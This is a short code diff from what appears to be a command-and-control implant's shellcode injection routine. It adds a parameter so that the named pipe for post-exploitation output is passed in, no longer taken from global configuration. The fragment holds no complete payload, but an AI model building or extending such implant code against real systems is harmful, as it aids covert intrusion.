@@ -14,6 +14,7 @@
  * @return BOOL
  */
 BOOL InjectShellcodeViaKit(
+	_In_  PCHAR   PostexPipename,
 	_In_  PBYTE   buffer, 
 	_In_  SIZE_T  bufferLen, 
 	_In_  PCHAR   InjectKit, 
@@ -32,7 +33,7 @@ BOOL InjectShellcodeViaKit(
 
     ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
 
-	Status = InitNamedPipe(&ov, &hPipe);
+	Status = InitNamedPipe(PostexPipename, &ov, &hPipe);
 	if ( Status == FALSE || hPipe == NULL ) 
 	{
 		_err("Failed to initialize named pipe. ERROR : %d", GetLastError())
@@ -122,11 +123,11 @@ END:
  * @param[inout] ov OVERLAPPED structure for pipe
  * @return BOOL
  */
-BOOL InitNamedPipe(_Inout_ OVERLAPPED* ov, _Out_ HANDLE* pOutHandle)
+BOOL InitNamedPipe(_In_ PCHAR PostexPipename, _Inout_ OVERLAPPED* ov, _Out_ HANDLE* pOutHandle)
 {
 	/* Setup Named Pipe in OVERLAPPED mode */
     char fullPipePath[256];
-    snprintf(fullPipePath, sizeof(fullPipePath), "\\\\.\\pipe\\%s", xenonConfig->pipename);
+    snprintf(fullPipePath, sizeof(fullPipePath), "\\\\.\\pipe\\%s", PostexPipename);
 
     HANDLE hPipe = CreateNamedPipeA(
         fullPipePath,
